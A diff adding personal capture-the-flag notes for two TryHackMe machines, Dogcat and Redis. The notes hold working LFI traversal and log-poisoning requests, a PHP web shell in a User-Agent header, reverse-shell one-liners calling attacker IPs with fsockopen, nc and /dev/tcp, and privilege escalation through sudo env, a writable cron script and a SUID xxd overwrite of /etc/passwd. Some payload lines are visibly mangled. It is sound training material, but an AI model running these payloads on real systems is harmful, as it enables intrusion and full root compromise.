@@ -605,6 +605,240 @@ MR ROBOT CTF
 	lennie@startup:-$file root.txt  //flag found
 
 =============================================================================
+#10 Dogcat-  Writesup https://fmash16.github.io/content/writeups/tryhackme/thm-DogCat.html  ,,https://shishirsubedi.com.np/thm/dogcat/#downloading-shellsh
+	Nmap scan- 
+	Open ports: * 22 - SSH * 80- http
+	We have a look at the webpage where it lets us view some dot or cat pictures
+	page is running a php that shows the pictures stored in the dogs/ or cats/
+	
+	//We try some basic LFI 
+	http://10.10.174.171/?view=../../../../../../../etc/passwd     //fails showing that only dogs or cats are allowed
+
+	//try adding “dog” after a null byte %00  
+	http://10.10.174.171/?view=../../../../../../../etc/passwd%00dog    //We see that we do bypass the string check but it fails to open a the file
+	we find that the script also adds the extension .php to the end of the file
+
+	Local File Inclusion
+	Googling a bit, we find a new php LFI technique found
+	https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion    //which is a great source for pentesters.
+
+	We use the technique to get our base64 encoded php source of dog.php and decode it to view the source.
+	http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog
+  
+	Now we see that we can also check the source of the index.php file using directroy traversal in the same way
+	http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog/../index
+
+	interesting here is that it allows us to pass an “ext” variable that contains the file extension.
+	On the variable being unset, it adds the default extension of .php
+
+	check now if we can read the /etc/passwd file     //we can!
+	check if we can find the log file where it logs all our requests. After fiddling around for a bit, 
+
+
+	LFI to RCEPermalink
+	https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/
+	We can read sensitive files, so what? It would be great if we could read a private key for a user if he/she has one in his/her .ssh directory. But turned out here was not. So I kept searching for the ways to use this lfi to get rce. This post explains different ways to achieve code execution using a local file inclusion. We can achieve this if we have permissions to read one of these files:
+
+	/var/log/apache/access.log
+	/var/log/apache/error.log
+	/var/log/vsftpd.log
+	/var/log/sshd.log
+	/var/log/mail
+	/proc/self/environ
+	/proc/self/fd
+
+
+	we find the logs in the /var/log/apache2/access.log finding out that the server is running apache2
+	http://10.10.11.194/?view==dog/../../../../../../var/log/apache2/access.log&ext=
+
+	We see that the log also saves our user-agent header, in our case, Mozilla Firefox
+	So, we check if we can inject some php code into our user-agent header
+
+	We can do this using burpsuite repeater to test again and again.
+	We change the header to hello to test and it works
+	GET view=dog/../../../../var/log/apache2/access.log&ext= HTTP/1.1
+
+	Now we test some php commands. First we try the system(“”) which is suposed to execute the command on the machine and print us the output
+	<?php system("ls")?>
+	GET view=dog/../../../../var/log/apache2/access.log&ext= HTTP/1.1
+
+	GET /?view==dog/../../../../../../var/log/apache2/access.log&ext= HTTP/1.1
+	Host: 10.10.11.194
+	User-Agent: <?php system("ls")?>
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Connection: close
+	Upgrade-Insecure-Requests: 1
+
+	But executing this once, we somehow break the machine and cannot access the log any more
+	system($_GET['cmd']);
+	GET view=dog/../../../../var/log/apache2/access.log&ext=&cmd=ls HTTP/
+
+	user-agent: <?php system($_GET['cmd']); ?>
+
+	We try some commands and see that we are www-data, we try getting a reverse shell using php. The php reverse shell:
+	php -r '$sock=fsockopen("10.8.6.75", 8888);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+	We must url encode the revshell passed in the command. The url encoded request stands:
+	Reference-> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php
+
+	10.10.12.161/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=php -r '$sock=fsockopen("192.168.220.133",1337);exec("/bin/bash -i <&3 >&3 2>&3");'
+	Note: Encode php -r '$sock=fsockopen("192.168.220.133",1337);exec("/bin/bash -i <&3 >&3 2>&3");
+
+	We start a nc listener on port 1337 and get the reverse shell.
+	
+	$flag1
+	>ls
+	we find the flag.php in the current folder. We cat out the contents to get the flag.
+	
+	flag1=“THM{Th1s_1s_N0t_4_Catdog_ab67edfa}”
+
+	##flag2
+	After digging around the files for a bit, we find our second flag in the /var/www directory.
+	flag2 = THM{LF1_t0_RC3_aec3fb}
+
+	## Privilege escalation - Root
+	find that our user can execute /usr/bin/env as sudo using the command sudo -l
+
+	We look for privesc using env in gtfobins   https://gtfobins.github.io/gtfobins/env/#shell
+	We find that a simple env /bin/sh gives us the shell. So we try that.
+	
+	www-data@xxxx:var/www sudo /user/bin/env /bin/sh    //now we gor root privi
+
+	flag3
+	And, we have escalated to root successfully. lets look for the remaining flags.We find our 3rd flag in the /root directory.
+	flag3 = “THM{D1ff3r3nt_3nv1ronments_874112}”
+
+	Looking around for a bit, we find a .dockerenv file in the root directory, which tells us that we are running inside a docker container.
+
+	we find an interesting folder in the /opt/backups directory, having a look at the backup.sh file, we find the following
+	tar cf /root/container/backup/backup.tar /root/container
+
+	backup.tar file we found. It might be running a cron job. We see that we have write permissions to the file and so, lets try writing a reverse shell into the backup.sh file.
+
+	open up a netcat listener on port 8888 and after some time, get a shell back from root.
+	This time, we see that we are on the machine iteself and not inside a docker container. Going into the root home, /root, we fine our flag4:
+	flag4 = “THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}”
+
+============================================================================================
+#11 redis
+	https://jc01.ninja/ctf/res/
+	https://book.hacktricks.xyz/pentesting/6379-pentesting-redis  Pentesting Redis
+
+	james@ninja:~$ nmap -sV -v -p- 10.10.105.18
+	PORT     STATE SERVICE VERSION
+8	0/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+	6379/tcp open  redis   Redis key-value store 6.0.7
+	From our initial recon, we have two ports open. Apache, and Redis.
+
+	From a gobuster scan with dirb big and dirbuster medium, we find nothing. Nothing isn't very interesting, so let's move on
+	
+	start enumerating Redis.
+	>sudo apt install redis-tools
+
+	we can try to connect to Redis without credentials
+	redis-cli -h 10.10.105.18
+	
+	Looking into Redis RCE gave me this resource. At a guess, I assumed we were able to write to /var/www/html as we are likely to be able to convert file writes to RCE using this as there's a webserver with Apache.
+	https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
+	By writing a PHP file using redis, we can then navigate to it in our browser to cause Apache to run the code. In this case, we're starting out with phpinfo to check our RCE. Then we can move on to trying reverse shells.
+
+james@ninja:~$ redis-cli -h 10.10.105.18
+10.10.105.18:6379> help
+redis-cli 6.0.8
+To get help about Redis commands type:
+        "help @" to get a list of commands in 
+        "help " for help on 
+        "help " to get a list of possible help topics
+        "quit" to exit
+
+To set redis-cli preferences:
+        ":set hints" enable online hints
+        ":set nohints" disable online hints
+	Set your preferences in ~/.redisclirc
+	10.10.105.18:6379> config set dir /var/www/html/
+	OK
+	10.10.105.18:6379> config set dbfilename redis.php
+	OK
+	10.10.105.18:6379> set test ""
+	OK
+	10.10.105.18:6379> save
+	OK
+	10.10.105.18:6379> set test '&1|nc 10.x.x.x 4242 >/tmp/f")?>'
+	OK
+	10.10.105.18:6379> save
+	OK
+	10.10.105.18:6379> set test "&1|nc 10.x.x.x 4242 >/tmp/f\")?>"
+	OK
+	10.10.105.18:6379> save
+	OK
+	10.10.105.18:6379> set test "& /dev/tcp/10.x.x.x/4242 0>&1'\"); ?>"
+	OK
+	10.10.105.18:6379> save
+	OK
+	10.10.105.18:6379> exit
+	That last payload worked, and we got a connection in our netcat listener. I recommend using rlwrap, as it allows you to use arrow keys in your reverse shell more easily
+
+	james@ninja:~$ rlwrap nc -lvnp 4242
+	listening on [any] 4242 ...
+	connect to [10.x.x.x] from (UNKNOWN) [10.10.105.18] 46706
+	bash: cannot set terminal process group (760): Inappropriate ioctl for device
+	bash: no job control in this shell
+	www-data@ubuntu:/var/www/html$ 
+	
+Privesc
+	We're a low priv user, so let's start enumerating to attempt to get some more permissions. As we're www-data and SSH isn't open, 
+	we can't use SSH to get a more stable shell so we'll have to stick with this for now.
+
+	www-data@ubuntu:/var/www/html$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;           
+	-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+	-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+	-rwsr-xr-x 1 root root 40152 Jan 27  2020 /bin/mount
+	-rwsr-xr-x 1 root root 40128 Mar 26  2019 /bin/su
+	-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+	-rwsr-xr-x 1 root root 27608 Jan 27  2020 /bin/umount
+	-rwsr-xr-x 1 root root 71824 Mar 26  2019 /usr/bin/chfn
+	-rwsr-xr-x 1 root root 18552 Mar 18  2020 /usr/bin/xxd
+	-rwsr-xr-x 1 root root 39904 Mar 26  2019 /usr/bin/newgrp
+	-rwsr-xr-x 1 root root 136808 Jan 31  2020 /usr/bin/sudo
+	-rwsr-xr-x 1 root root 54256 Mar 26  2019 /usr/bin/passwd
+	-rwsr-xr-x 1 root root 75304 Mar 26  2019 /usr/bin/gpasswd
+	-rwsr-xr-x 1 root root 40432 Mar 26  2019 /usr/bin/chsh
+	-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+	-rwsr-xr-- 1 root messagebus 42992 Jun 11 13:06 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+	-r-sr-xr-x 1 root root 13628 Sep  1 17:25 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+	-r-sr-xr-x 1 root root 14320 Sep  1 17:25 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+
+	Using the find command, I found that xxd had the SUID bit set. Let's try to exploit this!
+	Checking the GTFOBins entry for xxd reveals that we have arbitrary file read and write as root.
+
+	File read/write as root is great, we can grab the root flag right now if we want.
+	 Just getting the root flag isn't very interesting, and OSCP and similar certifications expect you to get a root shell.
+
+	We can write to any file on the system. Exploiting this, we can add our own root user to /etc/passwd and log in. As always, 
+	PayloadsAllTheThings to the rescue here! It's worth remembering that we need to upgrade our shell using python here so that we can use su or sudo.
+	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#writable-etcpasswd
+
+	www-data@ubuntu:/tmp$ cat /etc/passwd > passwd
+	www-data@ubuntu:/tmp$ echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> passwd                      
+	www-data@ubuntu:/tmp$ cat /tmp/passwd | xxd | xxd -r - /etc/passwd
+	www-data@ubuntu:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+	www-data@ubuntu:/tmp$ su hacker
+	Password: hacker
+	root@ubuntu:/tmp# 
+
+	Alternately, we could have created an /etc/sudoers entry to grant ourself sudo rights.
+
+	Getting the user's password
+	I'm sure the intended method was cracking this password first, and then using it to privesc with the ALL ALL sudo. As we had arbitrary file read as root, we could have dumped the shadow file earlier on and attempted to crack hashes
+
+	From our root shell, we can cat /etc/shadow, grab vianka's password hash and use John The Ripper or Hashcat to crack it. On my laptop, this took 1 second to crack so if it's taking much longer for you then something might be going wrong
+
+==================================================================================================================
+
+
 
 
 
